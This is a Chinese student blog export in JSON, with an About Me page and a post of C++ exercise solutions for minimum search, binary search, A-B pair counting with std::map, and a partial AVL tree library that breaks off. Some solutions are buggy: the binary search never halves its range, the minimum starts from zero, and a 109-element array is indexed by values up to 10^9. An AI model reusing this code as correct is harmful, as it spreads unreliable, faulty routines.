{"meta":{"title":"は永遠に不滅である","subtitle":"击碎你沉睡的灵魂！","description":"我们从不回头","author":"4riH04X","url":"http://example.com","root":"/"},"pages":[{"title":"About Me","text":"# 0. 论前世，不问来者 热爱学习的小菜鸡、又菜又爱玩的小菜鸡、一窍不通但一腔热血的小菜鸡...... 一句话送给此时的我和此时正在看的你： “种一棵树最好的时间是十年前，其次是现在！” # 1. 个人简介 船带网安学子一枚，手贱高考还填报了法学专业，因此笨人是 “高贵” 的网安法双学位学生。 见笑了，没学过法律的小菜鸡。 喜欢数据分析，二进制安全。另外引师傅们的自我介绍：“自学二进制漏洞，是个 pwn 究极菜鸡” 但足够热爱，足矣。又想起两句话： “有人问我，你害怕死亡吗？” “答曰：若立足年成天地之魄，死又何妨” 当坚持热爱每一天的生活，当把每分每秒塞满时，这是极其幸福的。 # 2.ID 解读 4riH04X，疯癫之意，希望能不顾牲命，H04X 即是 HOAX 疯狂、疯癫。 “即是我认定的巅峰，无顾艰辛，亦为此疯癫，纵千年无名” 希望能以此 ID 自嘲并鼓励自己不顾他人眼光，自我陶醉吧！ ~“Past lives couldn't ever hold me” ~&quot;Don't wake me, I'm not dreamin'&quot; # 3. 未来展望 借此博客的开辟，记录一下自己的学习体会和个人对一些知识浅薄的理解。 更多的希望自己借此博客激励自己， “仰天大笑出门去，我辈岂是蓬蒿人！”","path":"about/index.html","date":"11-02","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"11-02","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-02","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"11-02","excerpt":""},{"title":"friends","text":"# 友人帐 这些人都是巨佬，浅浅挂一下希望别骂我，，， t1d 糊涂涂の博客 EddieMurphy 最爱玩牛枝的Web","path":"friends/index.html","date":"11-05","excerpt":""},{"title":"links","text":"# 0. 说明 这里存放了一些实用的网站！！！持续更新，可以给我留言","path":"links/index.html","date":"11-05","excerpt":""}],"posts":[{"title":"查找题解","text":"# 查找题解 续更，考虑第一版没有分题干，这次开始做就分题干，另外加入一些题目的衍生题目和知识点，顺便是造福自己和读者吧。 写的太差，可能也没人看，😭😭😭😭，自己看 # 1. 找最小值 行高亮12345678910111213141516171819202122232425262728/*描述给出 n 和 n 个整数 ai，求这 n 个整数中最小值是什么。输入第一行输入一个正整数 n，表示数字个数。第二行输入 n 个非负整数，表示 a1,a2…an，以空格隔开。*///简单的查找，时间复杂度是n，一边输入一边比较#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() &#123; int input = 0; int tmp = 0; int ans = 0; cin &gt;&gt; ans; while (ans &gt; 0) &#123; cin &gt;&gt; input; if (input &lt; tmp)tmp = input; ans--; &#125; cout &lt;&lt; tmp &lt;&lt; endl; return 0;&#125; # 2. 查找（折半查找） C 算法 —— 折半查找_c 折半查找 - CSDN 博客 可以学一下这篇帖子，讲的还行，本题一开始采用循环的折半查找，读者也可以尝试递归。 但本题数据特殊，考虑存在相同数字的情况，作者设计了一个很妙的算法。（有点投机） 行高亮1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495/*2: 查找描述输入 n(n≤106) 个不超过 109的单调不减的（就是后面的数字不小于前面的数字）非负整数 a1,a2,…,an ，然后进行 m(m≤105) 次询问。对于每次询问，给出一个整数 q(q≤109)，要求输出这个数字在序列中第一次出现的编号，如果没有找到的话输出 -1 。输入第一行 2 个整数 n 和 m，表示数字个数和询问次数。第二行 n 个整数，表示这些待查询的数字。第三行 m 个整数，表示询问这些数字的编号，从 1 开始编号。输出m 个整数表示答案。样例输入11 31 3 3 3 5 7 9 11 13 15 151 3 6输出1 2 -1*//*1.既然是做题目，暴力查找就不考虑了。2.题目条件，单调递增，考虑折半查找，顺带复习一下喽3.，每个查找时间是log2n*/#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int BinarySearch(vector&lt;int&gt; a, int lenth, int target)//折半查找&#123; int low = 0; int high = lenth - 1; while (low &lt;= high) &#123; int mid = low + (high - low); if (a[mid] &gt; target) high = mid - 1; else if (a[mid] &lt; target) low = mid + 1; else return mid; &#125; return -1;&#125;int main_1() &#123; int n,m; cin &gt;&gt; n&gt;&gt;m; vector&lt;int&gt; input; while (n-- &gt; 0) &#123; int tmp; cin &gt;&gt; tmp; input.push_back(tmp); &#125; while (m-- &gt; 0) &#123; int Ask; cin &gt;&gt; Ask; cout &lt;&lt; BinarySearch(input, input.size(), Ask) &lt;&lt; &#x27; &#x27;; &#125; cout &lt;&lt; endl; return 0;&#125;//出现了一些问题，考虑到可能存在相同，因此上述这个只适合完全递增//考虑题目，输入 n(n≤106) 个不超过 109的单调不减的（就是后面的数字不小于前面的数字）非负整数//开一个Bool数组，记录1到109的数字是否出现过，没出现就是-1，出现过的置为它第一次出现的位置int main() &#123; int output[109]; for (int i = 0; i &lt; 109; i++) &#123; output[i] = -1; &#125; int n, m; cin &gt;&gt; n &gt;&gt; m; int ans = 0; while (ans++ &lt; n) &#123; int input; cin &gt;&gt; input; if (output[input] == -1) output[input] = ans; &#125; while (m-- &gt; 0) &#123; int input; cin &gt;&gt; input; cout &lt;&lt; output[input] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; return 0; &#125; # 3.A-B 数对（map 库的引入） 开始写了一个暴力查找的优化，但室友提到用 map 库，很爽，花了一点时间学了一下 map 优势如下： 1.map 类似于数组，比如数组 s [1], 但 map 可以让这里的数字 1 为任何索引，比如 s ['a'],s [10000],s [-1], 等等 2.map 函数本质是二叉树，红黑树，查找效率为 log2n，很方便 3. 因此，在建立好索引后，我们可以采用第 2 题的思想来做 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101/*3: A-B数对描述给出一串单调不下降的数以及一个数字 C，要求计算出所有A−B=C 的数对的个数（不同位置的数字一样的数对算不同的数对）。输入输入共两行。第一行，两个整数 N,C。第二行，N个整数，作为要求处理的那串数。输出一行，表示该串数中包含的满足A−B=C 的数对的个数。样例输入4 11 1 2 3输出3*//*注意题目：单调不下降简单想法，暴力查找细想：取A为最大，遍历B从最小，那么当A下降的时候，此时的B只能从小于B的里面找，可以将时间复杂度大大降低*/#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;//暴力算法的稍微优化版本int numA_B(vector&lt;int&gt;input, int C)&#123; int num = 0; int B_max = input.size() - 1; for (int i = input.size() - 1; i &gt; -1; i--) &#123; int A = input[i]; //cout&lt;&lt;&quot;A的值：&quot; &lt;&lt; A &lt;&lt; endl;//调试 if (A - input[0] &lt; 0) &#123; break; &#125; for (int j = B_max; j &gt; -1; j--) &#123; int B = input[j]; //cout &lt;&lt; &quot;B的值：&quot; &lt;&lt; B &lt;&lt; &quot; j的值：&quot; &lt;&lt; j&lt;&lt; endl;//调试 if (A - B == C) &#123; num++; if (j != input.size() - 1 &amp;&amp; B != input[j + 1]) &#123; B_max = j;//点睛之笔，每次去优化它的B_max &#125; &#125; &#125; &#125; return num;&#125;int main_1() &#123; int n, C; cin &gt;&gt; n &gt;&gt; C; vector&lt;int&gt;input; while (n-- &gt; 0) &#123; int a; cin &gt;&gt; a; input.push_back(a); &#125; int result = numA_B(input, C); cout &lt;&lt; result &lt;&lt; endl; return 0;&#125;//引入map包的优化，nlog2n//思想类似于第二题//map&lt;frist(键)，second（映射）&gt;//map内部是红黑树，自动排序//map根据键去找映射#include &lt;iostream&gt;#include &lt;map&gt;typedef struct ref &#123; int num;//出现次数 //int fp;&#125; reflect;//定义映射int main() &#123; int n = 0, C = 0; int Num = 0; std::cin &gt;&gt; n &gt;&gt; C; std::map&lt;int, reflect&gt; maps; int seq[3000] = &#123; 0 &#125;; //seq命名，代表seq是间距的 for (int i = 0; i &lt; n; ++i) &#123; std::cin &gt;&gt; seq[i];//输入键Key的值，键之间可以重复输值进去 ++maps[seq[i]].num;//一旦有这个数输入，我就将它的map容器中对应的元素的num值加1 //maps[seq[i]].fp = i;//更新该元素的fp为当前位置 &#125; for (int i = 0; i &lt; n; ++i) &#123;//查找，这里外面是n，里面是log2n，故总共是nlog2n Num += maps[seq[i] + C].num;//获取maps容器中键值为(seq[i] + C)的元素的num值 &#125; std::cout &lt;&lt; Num &lt;&lt; std::endl; return 0;&#125; # 4. 平衡二叉树 鄙人不才，看着别人的板子做了一个平衡二叉树的库，会慢慢去读，当然本题也有另外的思路。 # 4.1 平衡二叉树封装库 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774/*食用示例：#include &quot;BalanceBiTree.h&quot;template&lt;class ElementType&gt;;void main()&#123; Node&lt;int&gt; * root; BalanceBiTree&lt;int&gt; T(root); ...&#125;*/#ifndef _BALANCEBITREE_H_//头文件保护机制#define _BALANCEBITREE_H_#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std; template&lt; class ElementType&gt;/*int main() &#123; // 使用 Node&lt;int&gt; 实例化模板，其中 ElementType 被替换为 int 类型 Node&lt;int&gt; intNode; intNode.data = 42; // 使用 Node&lt;double&gt; 实例化模板，其中 ElementType 被替换为 double 类型 Node&lt;double&gt; doubleNode; doubleNode.data = 3.14; // 使用 Node&lt;std::string&gt; 实例化模板，其中 ElementType 被替换为 std::string 类型 Node&lt;std::string&gt; stringNode; stringNode.data = &quot;Hello, world!&quot;; return 0;&#125;*/struct Node&#123; ElementType data; struct Node *lChild; struct Node *rChild; int balanceFctor; //平衡因子&#125;;template&lt; class ElementType&gt;class BalanceBiTree&#123;//平衡二叉树的所有操作public : BalanceBiTree(Node&lt;ElementType&gt; *&amp; T); //初始化 static void menu(); //菜单 void destory(Node&lt;ElementType&gt; *&amp; T); //销毁二叉树 void insert(Node&lt;ElementType&gt; *&amp; T,Node&lt;ElementType&gt; * S); //将指针S所指节点插入二叉排序中 int BiTreeDepth(Node &lt;ElementType&gt; * T); //求树的高度 int getNodeFactor(Node&lt;ElementType&gt; *T); //求树中节点的平衡因子 void factorForTree(Node&lt;ElementType&gt; *&amp;T); //求树中的每个节点的平衡因子 void nodeFctorIsTwo(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p); //获得平衡因子为2或-2的节点 void nodeFctorIsTwoFather(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;f); //获得平衡因子为2或-2的节点的父节点 void LLAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f); //LL调整 void LRAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f); //LR调整 void RLAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f); //RL调整 void RRAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f); //RR调整 void AllAdjust(Node&lt;ElementType&gt; *&amp;T); //集成四种调整，并实时更新平衡因子 void preOrderTraverse(Node&lt;ElementType&gt; *T,int level); //先序遍历输出 void inOrderTraverse(Node &lt;ElementType&gt; *T,int level); //中序遍历输出 void BiTreeToArray(Node &lt;ElementType&gt; *T,ElementType A[],int i,int &amp;count); //二叉树转数组 void LevelTraverse(Node &lt;ElementType&gt; *T,ElementType B[],int num); //对二叉链表表示的二叉树，按从上到下，从左到右打印结点值，即按层次打印 void createSubBalanceBiTree(Node&lt;ElementType&gt; *&amp;T); //交互创建二叉平衡树 void createBalanceBiTreeFromArray(Node&lt;ElementType&gt; *&amp;T,ElementType A[],int n);//从数组中创建平衡二叉树 void search(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,ElementType x); //查找元素x Node &lt;ElementType&gt; * getElementFatherPointer(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;f,ElementType x); //获取某个元素的父亲指针，不存在返回NULL void getPriorElement(Node &lt;ElementType&gt; *&amp;T,ElementType &amp;min,ElementType &amp;max); //获取前驱元素 Node &lt;ElementType&gt; * getElementPriorPointer(Node &lt;ElementType&gt; *&amp;T); //获取某个元素的前驱指针 void getNextElement(Node &lt;ElementType&gt; *&amp;T,ElementType &amp;min,ElementType &amp;max); //获取后继元素 Node &lt;ElementType&gt; * getElementNextPointer(Node &lt;ElementType&gt; *&amp;T); //获取某个元素的后继指针 void deleteLeafNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,Node &lt;ElementType&gt; *&amp;f); //删除叶子节点 void deleteOneBranchNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p,Node &lt;ElementType&gt; *&amp;f); //删除仅有左子树或只有右子树的节点 void deleteTwoBranchNode(Node &lt;ElementType&gt; *&amp;T,Node &lt;ElementType&gt; *&amp;p); //删除既有左子树又有右子树的节点 void deleteOperate(Node &lt;ElementType&gt; *&amp;T,ElementType x); //集成删除的三种情况的操作private : Node&lt;ElementType&gt; *root; //树根&#125;;//初始化template&lt; class ElementType&gt;BalanceBiTree&lt;ElementType&gt;::BalanceBiTree(Node&lt;ElementType&gt; *&amp; T)&#123; T=NULL;&#125;//菜单template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::menu()&#123; cout&lt;&lt;&quot;*************************************************&quot;&lt;&lt;endl; cout&lt;&lt;&quot;0退出并销毁平衡二叉树&quot;&lt;&lt;endl; cout&lt;&lt;&quot;1二分查找算法实现查找元素&quot;&lt;&lt;endl; cout&lt;&lt;&quot;2插入结点构建二叉排序树（二叉平衡树）&quot;&lt;&lt;endl; cout&lt;&lt;&quot;3二叉排序树中查找指定值的结点&quot;&lt;&lt;endl; cout&lt;&lt;&quot;4二叉排序树中删除特定值的结点&quot;&lt;&lt;endl; cout&lt;&lt;&quot;5数组A[1..26]递增有序，设计算法以构造一棵平衡的二叉排序树&quot;&lt;&lt;endl; cout&lt;&lt;&quot;6树形输出&quot;&lt;&lt;endl; cout&lt;&lt;&quot;*************************************************&quot;&lt;&lt;endl;&#125;//销毁二叉树template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::destory(Node&lt;ElementType&gt; *&amp; T)&#123; if(T) &#123; destory(T-&gt;lChild); destory(T-&gt;rChild); delete T; &#125;&#125;//将指针S所指节点插入二叉排序中template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::insert(Node&lt;ElementType&gt; *&amp; T,Node&lt;ElementType&gt; * S)&#123; if(T==NULL) T=S; else if(S-&gt;data&lt;T-&gt;data) insert(T-&gt;lChild,S); else insert(T-&gt;rChild,S);&#125;//求树的高度template&lt; class ElementType&gt;int BalanceBiTree&lt;ElementType&gt;::BiTreeDepth(Node &lt;ElementType&gt; * T)&#123; int m,n; if(T==NULL) return 0; //空树，高度为0 else&#123; m=BiTreeDepth(T-&gt;lChild); //求左子树高度（递归） n=BiTreeDepth(T-&gt;rChild); //求右子树高度（递归） if(m&gt;n) &#123; return m+1; &#125; else&#123; return n+1; &#125; &#125;&#125;//求树中节点的平衡因子template&lt; class ElementType&gt;int BalanceBiTree&lt;ElementType&gt;::getNodeFactor(Node&lt;ElementType&gt; *T)&#123; int m=0,n=0; if(T) &#123; m=BiTreeDepth(T-&gt;lChild); n=BiTreeDepth(T-&gt;rChild); &#125; return m-n;&#125;//求树中的每个节点的平衡因子template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::factorForTree(Node&lt;ElementType&gt; *&amp;T)&#123; if(T) &#123; T-&gt;balanceFctor=getNodeFactor(T); factorForTree(T-&gt;lChild); factorForTree(T-&gt;rChild); &#125;&#125;//获得平衡因子为2或-2的节点template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::nodeFctorIsTwo(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p)&#123; if(T) &#123; if(T-&gt;balanceFctor==2||T-&gt;balanceFctor==-2) &#123; p=T; &#125; nodeFctorIsTwo(T-&gt;lChild,p); nodeFctorIsTwo(T-&gt;rChild,p); &#125;&#125;//获得平衡因子为2或-2的节点的父节点template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::nodeFctorIsTwoFather(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;f)&#123; if(T) &#123; if(T-&gt;lChild!=NULL) &#123; if(T-&gt;lChild-&gt;balanceFctor==2||T-&gt;lChild-&gt;balanceFctor==-2) &#123; f=T; &#125; &#125; if(T-&gt;rChild!=NULL) &#123; if(T-&gt;rChild-&gt;balanceFctor==2||T-&gt;rChild-&gt;balanceFctor==-2) &#123; f=T; &#125; &#125; nodeFctorIsTwoFather(T-&gt;lChild,f); nodeFctorIsTwoFather(T-&gt;rChild,f); &#125;&#125;//LL调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::LLAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f)&#123; Node&lt;ElementType&gt; *r; if(T==p) //-&gt;balanceFctor==2&amp;&amp;T-&gt;lChild-&gt;balanceFctor!=2 &#123; cout&lt;&lt;&quot;LL调整&quot;&lt;&lt;endl; T=p-&gt;lChild; //将P的左孩子提升为新的根节点 r=T-&gt;rChild; T-&gt;rChild=p; //将p降为其左孩子的右孩子 p-&gt;lChild=r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; else&#123; if(f-&gt;lChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;LL调整&quot;&lt;&lt;endl; f-&gt;lChild=p-&gt;lChild; //将P的左孩子提升为新的根节点 r=f-&gt;lChild-&gt;rChild; f-&gt;lChild-&gt;rChild=p; //将p降为其左孩子的右孩子 p-&gt;lChild=r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; if(f-&gt;rChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;LL调整&quot;&lt;&lt;endl; f-&gt;rChild=p-&gt;lChild; //将P的左孩子提升为新的根节点 r=f-&gt;rChild-&gt;rChild; f-&gt;rChild-&gt;rChild=p; //将p降为其左孩子的右孩子 p-&gt;lChild=r; //将p原来的左孩子的右孩子连接其p的左孩子 &#125; &#125;&#125;//LR调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::LRAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f)&#123; Node&lt;ElementType&gt; *l,*r; if(T==p) //-&gt;balanceFctor==2&amp;&amp;T-&gt;lChild-&gt;balanceFctor!=2 &#123; cout&lt;&lt;&quot;LR调整&quot;&lt;&lt;endl; T=p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r=T-&gt;rChild; l=T-&gt;lChild; T-&gt;rChild=p; T-&gt;lChild=p-&gt;lChild; T-&gt;lChild-&gt;rChild=l; T-&gt;rChild-&gt;lChild=r; &#125; else&#123; if(f-&gt;rChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;LR调整&quot;&lt;&lt;endl; f-&gt;rChild=p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r=f-&gt;rChild-&gt;rChild; l=f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;rChild=p; f-&gt;rChild-&gt;lChild=p-&gt;lChild; f-&gt;rChild-&gt;lChild-&gt;rChild=l; f-&gt;rChild-&gt;rChild-&gt;lChild=r; &#125; if(f-&gt;lChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;LR调整&quot;&lt;&lt;endl; f-&gt;lChild=p-&gt;lChild-&gt;rChild; //将P的左孩子的右孩子提升为新的根节点 r=f-&gt;lChild-&gt;rChild; l=f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;rChild=p; f-&gt;lChild-&gt;lChild=p-&gt;lChild; f-&gt;lChild-&gt;lChild-&gt;rChild=l; f-&gt;lChild-&gt;rChild-&gt;lChild=r; &#125; &#125;&#125;//RL调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::RLAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f)&#123; Node&lt;ElementType&gt; *l,*r; if(T==p) //-&gt;balanceFctor==-2&amp;&amp;T-&gt;rChild-&gt;balanceFctor!=-2 &#123; cout&lt;&lt;&quot;RL调整&quot;&lt;&lt;endl; T=p-&gt;rChild-&gt;lChild; r=T-&gt;rChild; l=T-&gt;lChild; T-&gt;lChild=p; T-&gt;rChild=p-&gt;rChild; T-&gt;lChild-&gt;rChild=l; T-&gt;rChild-&gt;lChild=r; &#125; else&#123; if(f-&gt;rChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;RL调整&quot;&lt;&lt;endl; f-&gt;rChild=p-&gt;rChild-&gt;lChild; r=f-&gt;rChild-&gt;rChild; l=f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;lChild=p; f-&gt;rChild-&gt;rChild=p-&gt;rChild; f-&gt;rChild-&gt;lChild-&gt;rChild=l; f-&gt;rChild-&gt;rChild-&gt;lChild=r; &#125; if(f-&gt;lChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;RL调整&quot;&lt;&lt;endl; f-&gt;lChild=p-&gt;rChild-&gt;lChild; r=f-&gt;lChild-&gt;rChild; l=f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;lChild=p; f-&gt;lChild-&gt;rChild=p-&gt;rChild; f-&gt;lChild-&gt;lChild-&gt;rChild=l; f-&gt;lChild-&gt;rChild-&gt;lChild=r; &#125; &#125;&#125;//RR调整template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::RRAdjust(Node&lt;ElementType&gt; *&amp;T,Node&lt;ElementType&gt; *&amp;p,Node&lt;ElementType&gt; *&amp;f)&#123; Node&lt;ElementType&gt; *l; if(T==p) //-&gt;balanceFctor==-2&amp;&amp;T-&gt;rChild-&gt;balanceFctor!=-2 &#123; cout&lt;&lt;&quot;RR调整&quot;&lt;&lt;endl; T=p-&gt;rChild; //将P的右孩子提升为新的根节点 l=T-&gt;lChild; T-&gt;lChild=p; //将p降为其右孩子的左孩子 p-&gt;rChild=l; //将p原来的右孩子的左孩子连接其p的右孩子 //注意：p-&gt;rChild-&gt;balanceFctor==0插入节点时用不上，删除节点时可用 &#125; else&#123; if(f-&gt;rChild==p) //f的右孩子是p &#123; cout&lt;&lt;&quot;RR调整&quot;&lt;&lt;endl; f-&gt;rChild=p-&gt;rChild; //将P的右孩子提升为新的根节点 l=f-&gt;rChild-&gt;lChild; f-&gt;rChild-&gt;lChild=p; //将p降为其右孩子的左孩子 p-&gt;rChild=l; //将p原来的右孩子的左孩子连接其p的右孩子 &#125; if(f-&gt;lChild==p) //f的左孩子是p &#123; cout&lt;&lt;&quot;RR调整&quot;&lt;&lt;endl; f-&gt;lChild=p-&gt;rChild; //将P的左孩子提升为新的根节点 l=f-&gt;lChild-&gt;lChild; f-&gt;lChild-&gt;lChild=p; //将p降为其左孩子的左孩子 p-&gt;rChild=l; //将p原来的右孩子的左孩子连接其p的右孩子 &#125; &#125;&#125;//集成四种调整，并实时更新平衡因子template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::AllAdjust(Node&lt;ElementType&gt; *&amp;T)&#123; Node&lt;ElementType&gt; *f=NULL,*p=NULL; factorForTree(T); nodeFctorIsTwoFather(T,f); nodeFctorIsTwo(T,p); while(p) &#123; factorForTree(T); if(p-&gt;balanceFctor==2&amp;&amp;(p-&gt;lChild-&gt;balanceFctor==1||p-&gt;lChild-&gt;balanceFctor==0)) &#123; LLAdjust(T,p,f); factorForTree(T); &#125; else if(p-&gt;balanceFctor==2&amp;&amp;p-&gt;lChild-&gt;balanceFctor==-1) &#123; LRAdjust(T,p,f); factorForTree(T); &#125; else if(p-&gt;balanceFctor==-2&amp;&amp;p-&gt;rChild-&gt;balanceFctor==1) &#123; RLAdjust(T,p,f); factorForTree(T); &#125; else if(p-&gt;balanceFctor==-2&amp;&amp;(p-&gt;rChild-&gt;balanceFctor==-1||p-&gt;rChild-&gt;balanceFctor==0)) //||p-&gt;rChild-&gt;balanceFctor==0 &#123; RRAdjust(T,p,f); &#125; f=NULL; p=NULL; nodeFctorIsTwoFather(T,f); nodeFctorIsTwo(T,p); &#125;&#125;//先序遍历输出template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::preOrderTraverse(Node&lt;ElementType&gt; *T,int level)&#123; if(T) &#123; cout&lt;&lt;&quot;先序&quot;&lt;&lt;&quot;(&quot;&lt;&lt;T-&gt;data&lt;&lt;&quot;,&quot;&lt;&lt;level&lt;&lt;&quot;)&quot;&lt;&lt;&quot; &quot;; preOrderTraverse(T-&gt;lChild,level+1); preOrderTraverse(T-&gt;rChild,level+1); &#125;&#125;//中序遍历算法template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::inOrderTraverse(Node &lt;ElementType&gt; * T,int level)&#123; if(T) &#123; inOrderTraverse(T-&gt;lChild,level+1); //递归调用先序遍历左子树 cout&lt;&lt;&quot;中序&quot;&lt;&lt;&quot;(&quot;&lt;&lt;T-&gt;data&lt;&lt;&quot;,&quot;&lt;&lt;level&lt;&lt;&quot;)&quot;&lt;&lt;&quot; &quot;; //访问根节点 inOrderTraverse(T-&gt;rChild,level+1); //递归调用先序遍历右子树 &#125;&#125;//二叉树转数组template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::BiTreeToArray(Node &lt;ElementType&gt; *T,ElementType A[],int i,int &amp;count)&#123; if(T!=NULL) &#123; A[i]=T-&gt;data; if(i&gt;count) count=i; BiTreeToArray(T-&gt;lChild,A,2*i,count); BiTreeToArray(T-&gt;rChild,A,2*i+1,count); &#125;&#125;//对二叉链表表示的二叉树，按从上到下，从左到右打印结点值，即按层次打印template&lt;class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::LevelTraverse(Node &lt;ElementType&gt; *T,ElementType B[],int num)&#123; int n,i,j,t,q,s,p,m=0,k=0; n=(int)((log(num)/log(2))+1); p=n; for(i=0;i&lt;n;i++) &#123; k=pow(2,m)+k; t=pow(2,m); j=pow(2,p-1)-1; q=pow(2,p)-1; s=q; for(j;j&gt;0;j--) &#123; cout&lt;&lt;&quot; &quot;; &#125; for(t;t&lt;=k;t++) &#123; if(B[t]==0) &#123; cout&lt;&lt;&quot;*&quot;; for(q;q&gt;0;q--) cout&lt;&lt;&quot; &quot;; q=s; &#125; else&#123; cout&lt;&lt;B[t]; for(q;q&gt;0;q--) cout&lt;&lt;&quot; &quot;; q=s; &#125; &#125; m++; p--; j=n-i-1; cout&lt;&lt;endl; &#125;&#125;//交互创建二叉平衡树template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::createSubBalanceBiTree(Node&lt;ElementType&gt; *&amp;T)&#123; int level=1; int i=1,j=0; int A[100]=&#123;0&#125;; int length=0; ElementType x; Node&lt;ElementType&gt; * S,*p; T=new Node&lt;ElementType&gt;; T-&gt;balanceFctor=0; T-&gt;lChild=NULL; T-&gt;rChild=NULL; p=T; cout&lt;&lt;&quot;请输入元素(-9999退出)：&quot;; cin&gt;&gt;x; T-&gt;data=x; while(x!=-9999) &#123; cout&lt;&lt;&quot;请输入元素：&quot;; cin&gt;&gt;x; if(x==-9999) return; S=new Node&lt;ElementType&gt;; S-&gt;data=x; S-&gt;balanceFctor=0; S-&gt;lChild=NULL; S-&gt;rChild=NULL; insert(p,S); AllAdjust(T); p=T; inOrderTraverse(T,level); cout&lt;&lt;endl; BiTreeToArray(T,A,i,length); cout&lt;&lt;&quot;其树状图为：&quot;&lt;&lt;endl; LevelTraverse(T,A,length); j=0; for(j;j&lt;100;j++) A[j]=0; level=1; i=1; &#125;&#125;//从数组中创建平衡二叉树template&lt; class ElementType&gt;void BalanceBiTree&lt;ElementType&gt;::createBalanceBiTreeFromArray(Node&lt;ElementType&gt; *&amp;T,ElementType A[],int n)&#123; Node&lt;ElementType&gt; * S,*p; int i=1; T=new Node&lt;ElementType&gt;; T-&gt;balanceFctor=0; T-&gt;lChild=NULL; T-&gt;rChild=NULL; p=T; T-&gt;data=A[0]; 